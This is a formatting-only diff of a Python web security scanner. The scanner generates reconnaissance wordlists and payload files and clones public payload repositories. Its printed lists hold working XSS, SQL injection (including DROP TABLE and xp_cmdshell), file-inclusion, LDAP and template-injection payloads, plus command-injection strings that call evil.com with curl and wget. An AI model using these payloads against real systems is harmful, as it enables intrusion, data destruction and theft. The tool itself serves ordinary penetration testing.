+2493,17 @@\n                         logger.log(f\"Failed to download: {filename}\", \"ERROR\")\n \n                 except Exception as e:\n                     logger.log(f\"Error downloading {source_url}: {e}\", \"ERROR\")\n \n-        logger.log(f\"Payload download complete: {success_count}/{total_count} successful\", \"INFO\")\n+        logger.log(\n+            f\"Payload download complete: {success_count}/{total_count} successful\",\n+            \"INFO\",\n+        )\n         return success_count > 0\n \n     @staticmethod\n-\n     def create_custom_payloads():\n         \"\"\"Create custom payload files with common exploit patterns\"\"\"\n \n         # XSS Payloads\n         xss_payloads = [\n@@ -2172,11 +2543,11 @@\n             \"' GROUP BY columnname HAVING 1=1--\",\n             \"'; EXEC xp_cmdshell('dir')--\",\n             \"'; DROP TABLE users--\",\n             \"1; SELECT * FROM users WHERE 't' = 't'\",\n             \"1 AND (SELECT COUNT(*) FROM sysobjects) > 0\",\n-            \"1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0\"\n+            \"1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0\",\n         ]\n \n         # LFI Payloads\n         lfi_payloads = [\n             \"../../../etc/passwd\",\n@@ -2195,11 +2566,11 @@\n             \"/etc/apache2/apache2.con\",\n             \"/etc/nginx/nginx.con\",\n             \"php://filter/convert.base64-encode/resource=index.php\",\n             \"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B\",\n             \"expect://id\",\n-            \"file:///etc/passwd\"\n+            \"file:///etc/passwd\",\n         ]\n \n         # Command Injection Payloads\n         rce_payloads = [\n             \"; id\",\n@@ -2223,130 +2594,512 @@\n             \"; whoami\",\n             \"| whoami\",\n             \"&& whoami\",\n             \"|| whoami\",\n             \"`whoami`\",\n-            \"$(whoami)\"\n+            \"$(whoami)\",\n         ]\n \n         # Create payload files\n         payload_sets = {\n             \"xss/xss_basic.txt\": xss_payloads,\n             \"sqli/sqli_basic.txt\": sqli_payloads,\n             \"lfi/lfi_basic.txt\": lfi_payloads,\n-            \"rce/rce_basic.txt\": rce_payloads\n+            \"rce/rce_basic.txt\": rce_payloads,\n         }\n \n         for file_path, payloads in payload_sets.items():\n             output_file = PAYLOADS_DIR / file_path\n             output_file.parent.mkdir(exist_ok=True)\n \n             try:\n-                with open(output_file, 'w') as f:\n+                with open(output_file, \"w\") as f:\n                     for payload in payloads:\n                         f.write(f\"{payload}\\n\")\n                 logger.log(f\"Created custom payload file: {file_path}\", \"SUCCESS\")\n             except Exception as e:\n                 logger.log(f\"Failed to create payload file {file_path}: {e}\", \"ERROR\")\n \n     @staticmethod\n-\n     def create_enhanced_wordlists():\n         \"\"\"Create enhanced wordlists for various discovery purposes\"\"\"\n \n         # Common directories (expanded)\n         common_dirs = [\n-            \"admin\", \"administrator\", \"api\", \"app\", \"application\", \"apps\", \"auth\",\n-            \"backup\", \"backups\", \"bin\", \"blog\", \"cache\", \"cgi-bin\", \"cms\", \"config\",\n-            \"content\", \"css\", \"dashboard\", \"data\", \"database\", \"db\", \"dev\", \"development\",\n-            \"doc\", \"docs\", \"download\", \"downloads\", \"etc\", \"files\", \"forum\", \"ftp\",\n-            \"git\", \"help\", \"home\", \"html\", \"images\", \"img\", \"inc\", \"include\", \"includes\",\n-            \"js\", \"json\", \"lib\", \"library\", \"log\", \"logs\", \"mail\", \"media\", \"mobile\",\n-            \"news\", \"old\", \"panel\", \"private\", \"public\", \"root\", \"scripts\", \"search\",\n-            \"secure\", \"security\", \"shop\", \"src\", \"static\", \"stats\", \"system\", \"temp\",\n-            \"test\", \"testing\", \"tmp\", \"upload\", \"uploads\", \"user\", \"users\", \"var\",\n-            \"web\", \"webmail\", \"website\", \"www\", \"xml\", \"assets\", \"build\", \"dist\",\n-            \"node_modules\", \"vendor\", \"storage\", \"resources\", \"tools\", \"utils\",\n-            \"bootstrap\", \"jquery\", \"fonts\", \"icons\", \"themes\", \"plugins\", \"modules\",\n-            \"wp-content\", \"wp-admin\", \"wp-includes\", \"wordpress\", \"joomla\", \"drupal\",\n-            \"phpmyadmin\", \"phpinfo\", \"info\", \"server-info\", \"server-status\", \"status\",\n-            \"health\", \"metrics\", \"debug\", \"trace\", \"error\", \"errors\", \"exception\",\n-            \"trace\", \"phpunit\", \"test-suite\", \"tests\", \"testing\", \"qa\", \"stage\", \"staging\"\n+            \"admin\",\n+            \"administrator\",\n+            \"api\",\n+            \"app\",\n+            \"application\",\n+            \"apps\",\n+            \"auth\",\n+            \"backup\",\n+            \"backups\",\n+            \"bin\",\n+            \"blog\",\n+            \"cache\",\n+            \"cgi-bin\",\n+            \"cms\",\n+            \"config\",\n+            \"content\",\n+            \"css\",\n+            \"dashboard\",\n+            \"data\",\n+            \"database\",\n+            \"db\",\n+            \"dev\",\n+            \"development\",\n+            \"doc\",\n+            \"docs\",\n+            \"download\",\n+            \"downloads\",\n+            \"etc\",\n+            \"files\",\n+            \"forum\",\n+            \"ftp\",\n+            \"git\",\n+            \"help\",\n+            \"home\",\n+            \"html\",\n+            \"images\",\n+            \"img\",\n+            \"inc\",\n+            \"include\",\n+            \"includes\",\n+            \"js\",\n+            \"json\",\n+            \"lib\",\n+            \"library\",\n+            \"log\",\n+            \"logs\",\n+            \"mail\",\n+            \"media\",\n+            \"mobile\",\n+            \"news\",\n+            \"old\",\n+            \"panel\",\n+            \"private\",\n+            \"public\",\n+            \"root\",\n+            \"scripts\",\n+            \"search\",\n+            \"secure\",\n+            \"security\",\n+            \"shop\",\n+            \"src\",\n+            \"static\",\n+            \"stats\",\n+            \"system\",\n+            \"temp\",\n+            \"test\",\n+            \"testing\",\n+            \"tmp\",\n+            \"upload\",\n+            \"uploads\",\n+            \"user\",\n+            \"users\",\n+            \"var\",\n+            \"web\",\n+            \"webmail\",\n+            \"website\",\n+            \"www\",\n+            \"xml\",\n+            \"assets\",\n+            \"build\",\n+            \"dist\",\n+            \"node_modules\",\n+            \"vendor\",\n+            \"storage\",\n+            \"resources\",\n+            \"tools\",\n+            \"utils\",\n+            \"bootstrap\",\n+            \"jquery\",\n+            \"fonts\",\n+            \"icons\",\n+            \"themes\",\n+            \"plugins\",\n+            \"modules\",\n+            \"wp-content\",\n+            \"wp-admin\",\n+            \"wp-includes\",\n+            \"wordpress\",\n+            \"joomla\",\n+            \"drupal\",\n+            \"phpmyadmin\",\n+            \"phpinfo\",\n+            \"info\",\n+            \"server-info\",\n+            \"server-status\",\n+            \"status\",\n+            \"health\",\n+            \"metrics\",\n+            \"debug\",\n+            \"trace\",\n+            \"error\",\n+            \"errors\",\n+            \"exception\",\n+            \"trace\",\n+            \"phpunit\",\n+            \"test-suite\",\n+            \"tests\",\n+            \"testing\",\n+            \"qa\",\n+            \"stage\",\n+            \"staging\",\n         ]\n \n         # Extended API endpoints\n         api_paths = [\n-            \"api/v1\", \"api/v2\", \"api/v3\", \"api/v4\", \"rest\", \"restapi\", \"graphql\", \"soap\",\n-            \"api/users\", \"api/login\", \"api/auth\", \"api/token\", \"api/admin\", \"api/config\",\n-            \"api/status\", \"api/health\", \"api/docs\", \"api/swagger\", \"api/openapi\",\n-            \"v1/users\", \"v1/auth\", \"v1/admin\", \"v2/users\", \"v2/auth\", \"v3/users\",\n-            \"api/internal\", \"api/public\", \"api/private\", \"api/external\", \"api/webhook\",\n-            \"webhook\", \"webhooks\", \"callback\", \"callbacks\", \"notify\", \"notifications\",\n-            \"oauth\", \"oauth2\", \"saml\", \"sso\", \"ldap\", \"ad\", \"connect\", \"integration\",\n-            \"sync\", \"import\", \"export\", \"bulk\", \"batch\", \"queue\", \"jobs\", \"tasks\",\n-            \"search\", \"filter\", \"query\", \"analytics\", \"reports\", \"dashboard-api\",\n-            \"mobile-api\", \"app-api\", \"internal-api\", \"service-api\", \"micro-service\"\n+            \"api/v1\",\n+            \"api/v2\",\n+            \"api/v3\",\n+            \"api/v4\",\n+            \"rest\",\n+            \"restapi\",\n+            \"graphql\",\n+            \"soap\",\n+            \"api/users\",\n+            \"api/login\",\n+            \"api/auth\",\n+            \"api/token\",\n+            \"api/admin\",\n+            \"api/config\",\n+            \"api/status\",\n+            \"api/health\",\n+            \"api/docs\",\n+            \"api/swagger\",\n+            \"api/openapi\",\n+            \"v1/users\",\n+            \"v1/auth\",\n+            \"v1/admin\",\n+            \"v2/users\",\n+            \"v2/auth\",\n+            \"v3/users\",\n+            \"api/internal\",\n+            \"api/public\",\n+            \"api/private\",\n+            \"api/external\",\n+            \"api/webhook\",\n+            \"webhook\",\n+            \"webhooks\",\n+            \"callback\",\n+            \"callbacks\",\n+            \"notify\",\n+            \"notifications\",\n+            \"oauth\",\n+            \"oauth2\",\n+            \"saml\",\n+            \"sso\",\n+            \"ldap\",\n+            \"ad\",\n+            \"connect\",\n+            \"integration\",\n+            \"sync\",\n+            \"import\",\n+            \"export\",\n+            \"bulk\",\n+            \"batch\",\n+            \"queue\",\n+            \"jobs\",\n+            \"tasks\",\n+            \"search\",\n+            \"filter\",\n+            \"query\",\n+            \"analytics\",\n+            \"reports\",\n+            \"dashboard-api\",\n+            \"mobile-api\",\n+            \"app-api\",\n+            \"internal-api\",\n+            \"service-api\",\n+            \"micro-service\",\n         ]\n \n         # Extended parameter names\n         common_params = [\n-            \"id\", \"user\", \"username\", \"password\", \"email\", \"token\", \"key\", \"api_key\",\n-            \"access_token\", \"auth\", \"session\", \"sid\", \"csr\", \"nonce\", \"callback\",\n-            \"redirect\", \"url\", \"path\", \"file\", \"filename\", \"page\", \"cmd\", \"command\",\n-            \"exec\", \"system\", \"shell\", \"query\", \"search\", \"filter\", \"sort\", \"order\",\n-            \"limit\", \"offset\", \"count\", \"format\", \"type\", \"method\", \"action\", \"debug\",\n-            \"lang\", \"locale\", \"theme\", \"skin\", \"template\", \"layout\", \"view\", \"mode\",\n-            \"admin\", \"role\", \"permission\", \"scope\", \"level\", \"access\", \"privilege\",\n-            \"secret\", \"private\", \"public\", \"hidden\", \"internal\", \"external\", \"data\",\n-            \"payload\", \"content\", \"body\", \"message\", \"text\", \"value\", \"input\", \"output\",\n-            \"source\", \"target\", \"destination\", \"origin\", \"referer\", \"referrer\", \"host\",\n-            \"domain\", \"subdomain\", \"port\", \"protocol\", \"scheme\", \"endpoint\", \"service\",\n-            \"module\", \"component\", \"widget\", \"plugin\", \"extension\", \"addon\", \"feature\"\n+            \"id\",\n+            \"user\",\n+            \"username\",\n+            \"password\",\n+            \"email\",\n+            \"token\",\n+            \"key\",\n+            \"api_key\",\n+            \"access_token\",\n+            \"auth\",\n+            \"session\",\n+            \"sid\",\n+            \"csr\",\n+            \"nonce\",\n+            \"callback\",\n+            \"redirect\",\n+            \"url\",\n+            \"path\",\n+            \"file\",\n+            \"filename\",\n+            \"page\",\n+            \"cmd\",\n+            \"command\",\n+            \"exec\",\n+            \"system\",\n+            \"shell\",\n+            \"query\",\n+            \"search\",\n+            \"filter\",\n+            \"sort\",\n+            \"order\",\n+            \"limit\",\n+            \"offset\",\n+            \"count\",\n+            \"format\",\n+            \"type\",\n+            \"method\",\n+            \"action\",\n+            \"debug\",\n+            \"lang\",\n+            \"locale\",\n+            \"theme\",\n+            \"skin\",\n+            \"template\",\n+            \"layout\",\n+            \"view\",\n+            \"mode\",\n+            \"admin\",\n+            \"role\",\n+            \"permission\",\n+            \"scope\",\n+            \"level\",\n+            \"access\",\n+            \"privilege\",\n+            \"secret\",\n+            \"private\",\n+            \"public\",\n+            \"hidden\",\n+            \"internal\",\n+            \"external\",\n+            \"data\",\n+            \"payload\",\n+            \"content\",\n+            \"body\",\n+            \"message\",\n+            \"text\",\n+            \"value\",\n+            \"input\",\n+            \"output\",\n+            \"source\",\n+            \"target\",\n+            \"destination\",\n+            \"origin\",\n+            \"referer\",\n+            \"referrer\",\n+            \"host\",\n+            \"domain\",\n+            \"subdomain\",\n+            \"port\",\n+            \"protocol\",\n+            \"scheme\",\n+            \"endpoint\",\n+            \"service\",\n+            \"module\",\n+            \"component\",\n+            \"widget\",\n+            \"plugin\",\n+            \"extension\",\n+            \"addon\",\n+            \"feature\",\n         ]\n \n         # Extended subdomain prefixes\n         subdomain_prefixes = [\n-            \"www\", \"mail\", \"ftp\", \"admin\", \"api\", \"dev\", \"test\", \"staging\", \"prod\",\n-            \"blog\", \"shop\", \"store\", \"app\", \"mobile\", \"m\", \"secure\", \"vpn\", \"remote\",\n-            \"support\", \"help\", \"docs\", \"wiki\", \"portal\", \"dashboard\", \"panel\", \"cpanel\",\n-            \"webmail\", \"email\", \"smtp\", \"pop\", \"imap\", \"ns1\", \"ns2\", \"dns\", \"cdn\",\n-            \"assets\", \"static\", \"media\", \"images\", \"img\", \"files\", \"uploads\", \"download\",\n-            \"git\", \"svn\", \"repo\", \"code\", \"source\", \"build\", \"ci\", \"jenkins\", \"gitlab\",\n-            \"github\", \"bitbucket\", \"jira\", \"confluence\", \"slack\", \"teams\", \"chat\",\n-            \"forum\", \"community\", \"social\", \"network\", \"connect\", \"share\", \"link\",\n-            \"go\", \"short\", \"tiny\", \"bit\", \"link\", \"redirect\", \"proxy\", \"gateway\",\n-            \"load\", \"balance\", \"cluster\", \"node\", \"worker\", \"master\", \"slave\", \"db\",\n-            \"database\", \"sql\", \"mongo\", \"redis\", \"elastic\", \"search\", \"solr\", \"ldap\",\n-            \"directory\", \"auth\", \"sso\", \"oauth\", \"saml\", \"identity\", \"iam\", \"rbac\",\n-            \"monitoring\", \"metrics\", \"logs\", \"trace\", \"debug\", \"error\", \"exception\"\n+            \"www\",\n+            \"mail\",\n+            \"ftp\",\n+            \"admin\",\n+            \"api\",\n+            \"dev\",\n+            \"test\",\n+            \"staging\",\n+            \"prod\",\n+            \"blog\",\n+            \"shop\",\n+            \"store\",\n+            \"app\",\n+            \"mobile\",\n+            \"m\",\n+            \"secure\",\n+            \"vpn\",\n+            \"remote\",\n+            \"support\",\n+            \"help\",\n+            \"docs\",\n+            \"wiki\",\n+            \"portal\",\n+            \"dashboard\",\n+            \"panel\",\n+            \"cpanel\",\n+            \"webmail\",\n+            \"email\",\n+            \"smtp\",\n+            \"pop\",\n+            \"imap\",\n+            \"ns1\",\n+            \"ns2\",\n+            \"dns\",\n+            \"cdn\",\n+            \"assets\",\n+            \"static\",\n+            \"media\",\n+            \"images\",\n+            \"img\",\n+            \"files\",\n+            \"uploads\",\n+            \"download\",\n+            \"git\",\n+            \"svn\",\n+            \"repo\",\n+            \"code\",\n+            \"source\",\n+            \"build\",\n+            \"ci\",\n+            \"jenkins\",\n+            \"gitlab\",\n+            \"github\",\n+            \"bitbucket\",\n+            \"jira\",\n+            \"confluence\",\n+            \"slack\",\n+            \"teams\",\n+            \"chat\",\n+            \"forum\",\n+            \"community\",\n+            \"social\",\n+            \"network\",\n+            \"connect\",\n+            \"share\",\n+            \"link\",\n+            \"go\",\n+            \"short\",\n+            \"tiny\",\n+            \"bit\",\n+            \"link\",\n+            \"redirect\",\n+            \"proxy\",\n+            \"gateway\",\n+            \"load\",\n+            \"balance\",\n+            \"cluster\",\n+            \"node\",\n+            \"worker\",\n+            \"master\",\n+            \"slave\",\n+            \"db\",\n+            \"database\",\n+            \"sql\",\n+            \"mongo\",\n+            \"redis\",\n+            \"elastic\",\n+            \"search\",\n+            \"solr\",\n+            \"ldap\",\n+            \"directory\",\n+            \"auth\",\n+            \"sso\",\n+            \"oauth\",\n+            \"saml\",\n+            \"identity\",\n+            \"iam\",\n+            \"rbac\",\n+            \"monitoring\",\n+            \"metrics\",\n+            \"logs\",\n+            \"trace\",\n+            \"debug\",\n+            \"error\",\n+            \"exception\",\n         ]\n \n         # Technology-specific wordlists\n         tech_specific = {\n-            \"php\": [\"index.php\", \"config.php\", \"admin.php\", \"login.php\", \"upload.php\",\n-                   \"info.php\", \"phpinfo.php\", \"test.php\", \"backup.php\", \"database.php\"],\n-            \"asp\": [\"default.asp\", \"index.asp\", \"admin.asp\", \"login.asp\", \"config.asp\",\n-                   \"global.asa\", \"web.config\", \"default.aspx\", \"admin.aspx\"],\n-            \"jsp\": [\"index.jsp\", \"admin.jsp\", \"login.jsp\", \"config.jsp\", \"web.xml\",\n-                   \"WEB-INF/web.xml\", \"META-INF/context.xml\"],\n+            \"php\": [\n+                \"index.php\",\n+                \"config.php\",\n+                \"admin.php\",\n+                \"login.php\",\n+                \"upload.php\",\n+                \"info.php\",\n+                \"phpinfo.php\",\n+                \"test.php\",\n+                \"backup.php\",\n+                \"database.php\",\n+            ],\n+            \"asp\": [\n+                \"default.asp\",\n+                \"index.asp\",\n+                \"admin.asp\",\n+                \"login.asp\",\n+                \"config.asp\",\n+                \"global.asa\",\n+                \"web.config\",\n+                \"default.aspx\",\n+                \"admin.aspx\",\n+            ],\n+            \"jsp\": [\n+                \"index.jsp\",\n+                \"admin.jsp\",\n+                \"login.jsp\",\n+                \"config.jsp\",\n+                \"web.xml\",\n+                \"WEB-INF/web.xml\",\n+                \"META-INF/context.xml\",\n+            ],\n             \"rails\": [\"config/routes.rb\", \"config/database.yml\", \"Gemfile\", \"Rakefile\"],\n             \"node\": [\"package.json\", \"app.js\", \"server.js\", \"index.js\", \"config.json\"],\n-            \"python\": [\"app.py\", \"main.py\", \"settings.py\", \"config.py\", \"requirements.txt\"],\n+            \"python\": [\n+                \"app.py\",\n+                \"main.py\",\n+                \"settings.py\",\n+                \"config.py\",\n+                \"requirements.txt\",\n+            ],\n             \"git\": [\".git/config\", \".git/HEAD\", \".git/logs/HEAD\", \".gitignore\"],\n-            \"env\": [\".env\", \".env.local\", \".env.production\", \".env.development\", \"config.json\"],\n-            \"docker\": [\"Dockerfile\", \"docker-compose.yml\", \".dockerignore\", \"entrypoint.sh\"]\n+            \"env\": [\n+                \".env\",\n+                \".env.local\",\n+                \".env.production\",\n+                \".env.development\",\n+                \"config.json\",\n+            ],\n+            \"docker\": [\n+                \"Dockerfile\",\n+                \"docker-compose.yml\",\n+                \".dockerignore\",\n+                \"entrypoint.sh\",\n+            ],\n         }\n \n         # Create comprehensive wordlist files\n         wordlist_sets = {\n             \"directories/dirs_common.txt\": common_dirs,\n             \"directories/dirs_api.txt\": api_paths,\n-            \"directories/dirs_admin.txt\": [d for d in common_dirs if any(x in d for x in [\"admin\", \"panel\", \"dashboard\", \"manage\"])],\n+            \"directories/dirs_admin.txt\": [\n+                d\n+                for d in common_dirs\n+                if any(x in d for x in [\"admin\", \"panel\", \"dashboard\", \"manage\"])\n+            ],\n             \"parameters/params_common.txt\": common_params,\n-            \"parameters/params_auth.txt\": [p for p in common_params if any(x in p for x in [\"auth\", \"token\", \"key\", \"session\", \"login\"])],\n+            \"parameters/params_auth.txt\": [\n+                p\n+                for p in common_params\n+                if any(x in p for x in [\"auth\", \"token\", \"key\", \"session\", \"login\"])\n+            ],\n             \"subdomains/subdomains_common.txt\": subdomain_prefixes,\n-            \"subdomains/subdomains_tech.txt\": [s for s in subdomain_prefixes if any(x in s for x in [\"dev\", \"test\", \"staging\", \"api\", \"admin\"])],\n+            \"subdomains/subdomains_tech.txt\": [\n+                s\n+                for s in subdomain_prefixes\n+                if any(x in s for x in [\"dev\", \"test\", \"staging\", \"api\", \"admin\"])\n+            ],\n         }\n \n         # Add technology-specific wordlists\n         for tech, paths in tech_specific.items():\n             wordlist_sets[f\"technologies/{tech}_files.txt\"] = paths\n@@ -2355,19 +3108,18 @@\n         for file_path, wordlist in wordlist_sets.items():\n             output_file = EXTRA_DIR / file_path\n             output_file.parent.mkdir(parents=True, exist_ok=True)\n \n             try:\n-                with open(output_file, 'w') as f:\n+                with open(output_file, \"w\") as f:\n                     for word in sorted(set(wordlist)):\n                         f.write(f\"{word}\\n\")\n                 logger.log(f\"Created wordlist file: {file_path}\", \"SUCCESS\")\n             except Exception as e:\n                 logger.log(f\"Failed to create wordlist file {file_path}: {e}\", \"ERROR\")\n \n     @staticmethod\n-\n     def get_best_wordlist(category: str, subcategory: str = \"common\") -> Optional[Path]:\n         \"\"\"Get the best available wordlist for a category\"\"\"\n         # Check local custom wordlists first\n         local_file = EXTRA_DIR / category / f\"{category}_{subcategory}.txt\"\n         if local_file.exists() and local_file.stat().st_size > 0:\n@@ -2391,11 +3143,10 @@\n                     return wordlist_file\n \n         return None\n \n     @staticmethod\n-\n     def create_enhanced_payloads():\n         \"\"\"Create comprehensive payload collections for various attack vectors\"\"\"\n         # XSS payloads\n         xss_payloads = [\n             \"<script>alert('XSS')</script>\",\n@@ -2415,11 +3166,11 @@\n             \"<video><source onerror=alert('XSS')>\",\n             \"<audio src=x onerror=alert('XSS')>\",\n             \"<select onfocus=alert('XSS') autofocus>\",\n             \"<textarea onfocus=alert('XSS') autofocus>\",\n             \"<keygen onfocus=alert('XSS') autofocus>\",\n-            \"<embed src=javascript:alert('XSS')>\"\n+            \"<embed src=javascript:alert('XSS')>\",\n         ]\n \n         # SQL injection payloads\n         sqli_payloads = [\n             \"' OR '1'='1\",\n@@ -2439,11 +3190,11 @@\n             \"admin'--\",\n             \"admin' #\",\n             \"admin'/*\",\n             \"' OR 1=1/*\",\n             \"' OR 'something' like 'some%\",\n-            \"' waitfor delay '00:00:05'--\"\n+            \"' waitfor delay '00:00:05'--\",\n         ]\n \n         # Directory traversal payloads\n         lfi_payloads = [\n             \"../../../etc/passwd\",\n@@ -2463,11 +3214,11 @@\n             \"C:\\\\boot.ini\",\n             \"C:\\\\windows\\\\system32\\\\config\\\\sam\",\n             \"../../../../../../../../../etc/passwd\",\n             \"....//....//....//....//....//....//etc/passwd\",\n             \"/etc/passwd%00\",\n-            \"etc/passwd%00.jpg\"\n+            \"etc/passwd%00.jpg\",\n         ]\n \n         # Command injection payloads\n         rce_payloads = [\n             \"; whoami\",\n@@ -2487,11 +3238,11 @@\n             \"|| cat /etc/passwd\",\n             \"`cat /etc/passwd`\",\n             \"$(cat /etc/passwd)\",\n             \"; ping -c 4 127.0.0.1\",\n             \"; curl http://evil.com/\",\n-            \"; wget http://evil.com/\"\n+            \"; wget http://evil.com/\",\n         ]\n \n         # LDAP injection payloads\n         ldap_payloads = [\n             \"*)(uid=*))(|(uid=*\",\n@@ -2501,11 +3252,11 @@\n             \"admin)(&(password=*))\",\n             \"admin)(!(&(1=0)))\",\n             \")|(&(objectClass=*)(uid=admin))\",\n             \"*)(|(objectClass=*))\",\n             \"admin))(|(uid=*\",\n-            \"*)(&(objectClass=user)(uid=*))\"\n+            \"*)(&(objectClass=user)(uid=*))\",\n         ]\n \n         # Template payloads\n         ssti_payloads = [\n             \"{{7*7}}\",\n@@ -2517,37 +3268,36 @@\n             \"<%= 7*7 %>\",\n             \"${{<%[%'\\\"}}%\\\\\",\n             \"#{7*7}\",\n             \"{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}\",\n             \"${T(java.lang.System).getenv()}\",\n-            \"{{''.constructor.constructor('alert(1)')()}}\"\n+            \"{{''.constructor.constructor('alert(1)')()}}\",\n         ]\n \n         # Create payload files\n         payload_sets = {\n             \"xss/advanced_xss.txt\": xss_payloads,\n             \"sqli/advanced_sqli.txt\": sqli_payloads,\n             \"lfi/directory_traversal.txt\": lfi_payloads,\n             \"rce/command_injection.txt\": rce_payloads,\n             \"ldap/ldap_injection.txt\": ldap_payloads,\n-            \"ssti/template_injection.txt\": ssti_payloads\n+            \"ssti/template_injection.txt\": ssti_payloads,\n         }\n \n         for file_path, payloads in payload_sets.items():\n             output_file = PAYLOADS_DIR / file_path\n             output_file.parent.mkdir(parents=True, exist_ok=True)\n \n             try:\n-                with open(output_file, 'w') as f:\n+                with open(output_file, \"w\") as f:\n                     for payload in payloads:\n                         f.write(f\"{payload}\\n\")\n                 logger.log(f\"Created payload file: {file_path}\", \"SUCCESS\")\n             except Exception as e:\n                 logger.log(f\"Failed to create payload file {file_path}: {e}\", \"ERROR\")\n \n     @staticmethod\n-\n     def get_payload_file(category: str, subcategory: str = \"basic\") -> Optional[Path]:\n         \"\"\"Get the best available payload file for a category\"\"\"\n         payload_file = PAYLOADS_DIR / category / f\"{category}_{subcategory}.txt\"\n         if payload_file.exists() and payload_file.stat().st_size > 0:\n             return payload_file\n@@ -2565,11 +3315,10 @@\n                     return payload_file\n \n         return None\n \n     @staticmethod\n-\n     def show_payload_stats():\n         \"\"\"Display payload and wordlist statistics\"\"\"\n         print(\"\\n\\033[92m\ud83d\udcca Payload & Wordlist Statistics:\\033[0m\")\n \n         # Payload statistics\n@@ -2577,33 +3326,42 @@\n         for category_dir in PAYLOADS_DIR.iterdir():\n             if category_dir.is_dir():\n                 files = list(category_dir.glob(\"*.txt\"))\n                 file_count = len(files)\n                 if file_count > 0:\n-                    total_lines = sum(len(read_lines(f)) for f in files if f.stat().st_size > 0)\n-                    print(f\"  \ud83c\udfaf {category_dir.name}: {file_count} files, {total_lines:,} payloads\")\n+                    total_lines = sum(\n+                        len(read_lines(f)) for f in files if f.stat().st_size > 0\n+                    )\n+                    print(\n+                        f\"  \ud83c\udfaf {category_dir.name}: {file_count} files, {total_lines:,} payloads\"\n+                    )\n                     payload_count += total_lines\n \n         # Wordlist statistics\n         wordlist_count = 0\n         for category_dir in EXTRA_DIR.iterdir():\n             if category_dir.is_dir():\n                 files = list(category_dir.glob(\"*.txt\"))\n                 file_count = len(files)\n                 if file_count > 0:\n-                    total_lines = sum(len(read_lines(f)) for f in files if f.stat().st_size > 0)\n-                    print(f\"  \ud83d\udcdd {category_dir.name}: {file_count} files, {total_lines:,} entries\")\n+                    total_lines = sum(\n+                        len(read_lines(f)) for f in files if f.stat().st_size > 0\n+                    )\n+                    print(\n+                        f\"  \ud83d\udcdd {category_dir.name}: {file_count} files, {total_lines:,} entries\"\n+                    )\n                     wordlist_count += total_lines\n \n-        print(f\"\\n\\033[96m\ud83d\udcc8 Total: {payload_count:,} payloads, {wordlist_count:,} wordlist entries\\033[0m\")\n+        print(\n+            f\"\\n\\033[96m\ud83d\udcc8 Total: {payload_count:,} payloads, {wordlist_count:,} wordlist entries\\033[0m\"\n+        )\n \n \n class EnhancedNucleiManager:\n     \"\"\"Enhanced nuclei template management with community sources\"\"\"\n \n     @staticmethod\n-\n     def update_nuclei_templates():\n         \"\"\"Update nuclei templates from multiple sources\"\"\"\n         logger.log(\"Updating nuclei templates from multiple sources...\", \"INFO\")\n \n         # Core nuclei templates\n@@ -2617,50 +3375,56 @@\n         # Additional community template sources\n         community_sources = [\n             {\n                 \"name\": \"SecLists Integration\",\n                 \"url\": \"https://github.com/danielmiessler/SecLists\",\n-                \"path\": EXT_DIR / \"seclists\"\n+                \"path\": EXT_DIR / \"seclists\",\n             },\n             {\n                 \"name\": \"FuzzDB Integration\",\n                 \"url\": \"https://github.com/fuzzdb-project/fuzzdb\",\n-                \"path\": EXT_DIR / \"fuzzdb\"\n+                \"path\": EXT_DIR / \"fuzzdb\",\n             },\n             {\n                 \"name\": \"PayloadsAllTheThings\",\n                 \"url\": \"https://github.com/swisskyrepo/PayloadsAllTheThings\",\n-                \"path\": EXT_DIR / \"payloads-all-the-things\"\n-            }\n+                \"path\": EXT_DIR / \"payloads-all-the-things\",\n+            },\n         ]\n \n         for source in community_sources:\n             try:\n                 if not source[\"path\"].exists():\n                     logger.log(f\"Cloning {source['name']}...\", \"INFO\")\n-                    result = safe_run_command([\n-                        \"git\", \"clone\", \"--depth\", \"1\",\n-                        source[\"url\"], str(source[\"path\"])\n-                    ], timeout=300)\n+                    result = safe_run_command(\n+                        [\n+                            \"git\",\n+                            \"clone\",\n+                            \"--depth\",\n+                            \"1\",\n+                            source[\"url\"],\n+                            str(source[\"path\"]),\n+                        ],\n+                        timeout=300,\n+                    )\n                     if result and result.returncode == 0:\n                         logger.log(f\"{source['name']} cloned successfully\", \"SUCCESS\")\n                     else:\n                         logger.log(f\"Failed to clone {source['name']}\", \"WARNING\")\n                 else:\n                     logger.log(f\"Updating {source['name']}...\", \"INFO\")\n-                    result = safe_run_command([\n-                        \"git\", \"pull\"\n-                    ], cwd=source[\"path\"], timeout=120)\n+                    result = safe_run_command(\n+                        [\"git\", \"pull\"], cwd=source[\"path\"], timeout=120\n+                    )\n                     if result and result.returncode == 0:\n                         logger.log(f\"{source['name']} updated successfully\", \"SUCCESS\")\n                     else:\n                         logger.log(f\"Failed to update {source['name']}\", \"WARNING\")\n             except Exception as e:\n                 logger.log(f\"Error with {source['name']}: {e}\", \"ERROR\")\n \n     @staticmethod\n-\n     def get_nuclei_template_paths() -> List[str]:\n         \"\"\"Get all available nuclei template paths\"\"\"\n         template_paths = []\n \n         # Default nuclei templates\n@@ -2680,11 +3444,10 @@\n             template_paths.append(str(external_templates))\n \n         return template_paths\n \n     @staticmethod\n-\n     def create_custom_nuclei_templates():\n         \"\"\"Create custom nuclei templates for enhanced detection\"\"\"\n         custom_dir = HERE / \"nuclei-templates\" / \"custom\"\n         custom_dir.mkdir(parents=True, exist_ok=True)\n \n@@ -2736,70 +3499,81 @@\n             logger.log(\"Created custom nuclei template: common-vulns.yaml\", \"SUCCESS\")\n         except Exception as e:\n             logger.log(f\"Failed to create custom nuclei template: {e}\", \"ERROR\")\n \n     @staticmethod\n-\n-\n     def show_nuclei_stats():\n         \"\"\"Display nuclei template statistics\"\"\"\n         template_paths = EnhancedNucleiManager.get_nuclei_template_paths()\n \n         print(\"\\n\\033[92m\ud83c\udfaf Nuclei Template Statistics:\\033[0m\")\n         total_templates = 0\n \n         for path in template_paths:\n             path_obj = Path(path)\n             if path_obj.exists():\n-                yaml_files = list(path_obj.rglob(\"*.yaml\")) + list(path_obj.rglob(\"*.yml\"))\n+                yaml_files = list(path_obj.rglob(\"*.yaml\")) + list(\n+                    path_obj.rglob(\"*.yml\")\n+                )\n                 count = len(yaml_files)\n                 total_templates += count\n                 print(f\"  \ud83d\udcc2 {path_obj.name}: {count:,} templates\")\n \n         print(f\"\\n\\033[96m\ud83d\udd25 Total Nuclei Templates: 